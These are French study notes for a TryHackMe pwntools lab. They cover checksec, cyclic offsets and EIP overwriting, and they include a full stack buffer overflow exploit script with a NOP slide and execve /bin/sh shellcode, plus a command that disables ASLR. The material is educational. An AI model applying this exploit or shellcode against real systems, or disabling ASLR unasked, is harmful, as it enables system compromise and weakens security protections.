## Checksec 

Pour checker les protections d'un programme
```
checksec <elf>
```

## Cyclic

Créer un pattern :
```
padding = cyclic(100)
```
Trouver un pattern particulier :

```
padding = cyclic(cyclic_find('jaaa'))
```

## Ecrire dans EIP

```
eip = p32(0xdeadbeef)
payload = padding + eip
```

Autre :

Trouver avec GDB l'adresse de ESP (pointeur de la stack), puis

```
eip = p32(<adresseESP> + <Offset>)
```
L'offset peut être égale à 8/16 ou plus ! Il sert à faire pop le shellcode plus loin dans la stack

## Shellcode crafting

```
shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
```

## Exemple de script 

```
from pwn import *

proc = process('./intro2pwnFinal')
proc.recvline()
padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd510+200)
nop_slide = "\x90"*1000
shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
payload = padding + eip + nop_slide + shellcode
proc.send(payload)
proc.interactive()
```

Ici beaucoup de NOP sont présent de sorte à ce que notre shellcode puisse atterir tranquillement dans la stack.
Pour désactivé ASLR avec sudo : 
```
echo 0 | tee /proc/sys/kernel/randomize_va_space
```
Source : <a href="https://tryhackme.com/room/introtopwntools">TryHackMe</a>
